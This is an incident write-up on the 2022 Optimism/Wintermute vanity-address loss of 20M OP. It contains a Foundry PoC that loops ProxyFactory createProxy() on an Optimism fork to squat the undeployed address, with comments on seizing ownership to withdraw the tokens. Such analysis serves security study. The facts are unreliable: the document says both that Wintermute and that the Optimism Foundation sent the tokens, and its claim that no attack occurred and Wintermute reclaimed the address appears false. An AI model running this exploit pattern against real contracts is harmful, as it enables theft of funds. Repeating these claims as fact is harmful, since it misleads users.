# Optimism — Wintermute Vanity Address Proxy Deployment Failure Analysis

| Item | Details |
|------|------|
| **Date** | 2022-06-09 |
| **Protocol** | Optimism (OP Token) / Wintermute |
| **Chain** | Optimism |
| **Loss** | 20,000,000 OP tokens (mistakenly sent to wrong address — design misunderstanding, not an attack) |
| **Related Address** | [0x4f3a120E72C76c22ae802D129F599BFDbc31cb81](https://optimistic.etherscan.io/address/0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) (non-existent vanity address) |
| **Vulnerable Contract** | ProxyFactory [0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B](https://optimistic.etherscan.io/address/0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B) |
| **Root Cause** | Wintermute sent OP tokens to a vanity address (CREATE opcode-based) that was deployed on Ethereum but had never been deployed on Optimism. The PoC demonstrates that the address can be generated on Optimism by looping through ProxyFactory `createProxy()` calls |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Optimism_exp.sol) |

---
## 1. Vulnerability Overview

This incident was not a traditional smart contract vulnerability, but rather an accident caused by a misunderstanding of cross-chain address consistency.

Wintermute assumed that the vanity address (`0x4f3a120E72C76c22ae802D129F599BFDbc31cb81`) used on Ethereum also existed identically on Optimism, and sent 20,000,000 OP tokens to that address. However, contract addresses generated using the CREATE opcode can differ per chain because the deploying transaction nonce may vary — meaning Ethereum's vanity address did not automatically exist on Optimism.

The DeFiHackLabs PoC demonstrates that by repeatedly calling the `createProxy()` function on Optimism's ProxyFactory, the vanity address can be reproduced on Optimism. This shows that an attacker who gains control of the contract at that address could withdraw the OP tokens.

---
## 2. Vulnerable Code Analysis

```solidity
// ProxyFactory: a specific address can be generated via createProxy
contract ProxyFactory {
    // CREATE opcode: address = keccak256(rlp([factory, nonce]))[12:]
    // By deploying enough proxies, the target address can be reached
    function createProxy(
        address masterCopy,
        bytes calldata data
    ) external returns (address payable proxy) {
        // ❌ Callable by anyone — target address reachable by consuming nonces
        proxy = new GnosisSafeProxy(masterCopy);
        if (data.length > 0) {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                if eq(call(gas(), proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) {
                    revert(0, 0)
                }
            }
        }
        emit ProxyCreation(proxy, masterCopy);
    }
}

// ❌ Vulnerable cross-chain assumption (conceptual error)
// On Ethereum: factory.nonce = 5 → proxy address = 0x4f3a...
// On Optimism: factory.nonce = 0 → proxy address ≠ 0x4f3a...
//              factory.nonce = N(?) → proxy address = 0x4f3a...
//              → reachable by calling createProxy() N times

// ✅ Correct cross-chain address management
// Use CREATE2: keccak256(0xff, factory, salt, bytecodeHash)
// → Setting the same salt guarantees the same address on every chain
contract SafeProxyFactoryFixed {
    function createProxyWithNonce(
        address masterCopy,
        bytes calldata initializer,
        uint256 saltNonce  // ✅ Deterministic salt
    ) external returns (address payable proxy) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
        // ✅ CREATE2: generates the same address regardless of chain
        proxy = deployProxyWithNonce(masterCopy, initializer, salt);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**ProxyFactory.sol** — Entry point:
```solidity
// ❌ Root cause: Wintermute sent OP tokens to a vanity address (CREATE opcode-based) used on Ethereum that had never been deployed on Optimism. ProxyF
    function createProxy(address masterCopy, bytes memory data)  // ❌ Vulnerability
        public
        returns (Proxy proxy)
    {
        proxy = new Proxy(masterCopy);
        if (data.length > 0)
            // solium-disable-next-line security/no-inline-assembly
            assembly {
                if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) { revert(0, 0) }
            }
        emit ProxyCreation(proxy);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Incident Timeline
    │
    ├─[Background] Wintermute: uses Ethereum vanity address
    │               0x4f3a120E72C76c22ae802D129F599BFDbc31cb81
    │               (Gnosis Safe Proxy created via CREATE opcode)
    │
    ├─[Mistake] Optimism Foundation → sends OP to Wintermute vanity address
    │             20,000,000 OP → 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81
    │             ⚡ Address not yet deployed on Optimism
    │             → Tokens locked at an address nobody controls yet
    │
    PoC Demonstration (DeFiHackLabs)
    │
    ├─[P1] ProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
    │       .createProxy(masterCopy, "") called repeatedly
    │
    ├─[P2] Check each deployed proxy address
    │       target == 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81 ?
    │       → NO: keep looping
    │       → YES: target Proxy successfully deployed
    │
    ├─[P3] Initialize the deployed Proxy (set attacker as owner)
    │       → 20,000,000 OP becomes withdrawable
    │
    └─[Actual] After the incident, Wintermute pre-empted the address and recovered the OP
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IProxyFactory {
    // For consuming nonces — repeated calls eventually reach the target address
    function createProxy(
        address masterCopy,
        bytes calldata data
    ) external returns (address payable proxy);
}

contract ContractTest is Test {
    IProxyFactory proxyFactory =
        IProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);

    address masterCopy = 0xE7145dd6287AE53326347f3A6694fCf2954bcD8A;
    // Wintermute vanity address (not deployed on Optimism)
    address target     = 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81;

    function setUp() public {
        // Fork Optimism
        vm.createSelectFork("optimism", 10_607_735);
    }

    function testExploit() public {
        // PoC: repeatedly call createProxy to generate the target address
        // ⚡ Consume the ProxyFactory's nonce until the address generated
        //    by CREATE matches the target
        uint256 count = 0;
        while (true) {
            address payable proxy = proxyFactory.createProxy(masterCopy, "");
            count++;

            if (proxy == target) {
                emit log_string("Target address found!");
                emit log_named_uint("Iterations required", count);
                emit log_named_address("Proxy deployed at", proxy);

                // At this point, calling the masterCopy's initializer
                // would set the attacker as owner, enabling withdrawal of 20M OP
                // e.g. proxy.setup([attacker], 1, ...) 
                break;
            }
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Cross-chain address mismatch (incorrect vanity address assumption) |
| **CWE** | CWE-20: Improper Input Validation (recipient address not verified) |
| **OWASP DeFi** | Misunderstanding of CREATE opcode address non-determinism across chains |
| **Attack Vector** | Squatting the target vanity address by looping ProxyFactory `createProxy()` |
| **Precondition** | Wintermute sent OP tokens before deploying the vanity address on Optimism |
| **Impact** | Potential theft of 20,000,000 OP (~$20M at time) |

---
## 6. Remediation Recommendations

1. **Use CREATE2**: When cross-chain address consistency is required, use CREATE2 with a deterministic salt instead of CREATE. Given the same salt and bytecode, the same address is generated on every EVM chain.
2. **Verify address before token transfer**: Before sending large amounts of tokens, always confirm that the destination address has deployed code (`extcodesize`).
3. **Verify addresses when deploying to new chains**: Before reusing an existing Ethereum address on a new chain, confirm that the contract has been identically deployed at that address.
4. **Understand vanity address risk**: Vanity addresses created via the CREATE opcode depend on the factory nonce, so the same address is not guaranteed across chains.

---
## 7. Lessons Learned

- **CREATE vs CREATE2**: Contract addresses generated by CREATE are a function of the deployer address and nonce, so they are not guaranteed to be identical across chains. CREATE2 generates addresses deterministically by incorporating a salt.
- **The pitfall of multi-chain expansion**: To reuse an address from Ethereum on a new L2/sidechain, the same deployment process must be executed there first.
- **20M OP**: While no actual attack occurred (Wintermute pre-empted and reclaimed the address themselves), the exploitability was real, making this an important case study.
- **The role of public PoCs**: The DeFiHackLabs PoC proved exploitability and raised awareness about similar cross-chain pitfalls.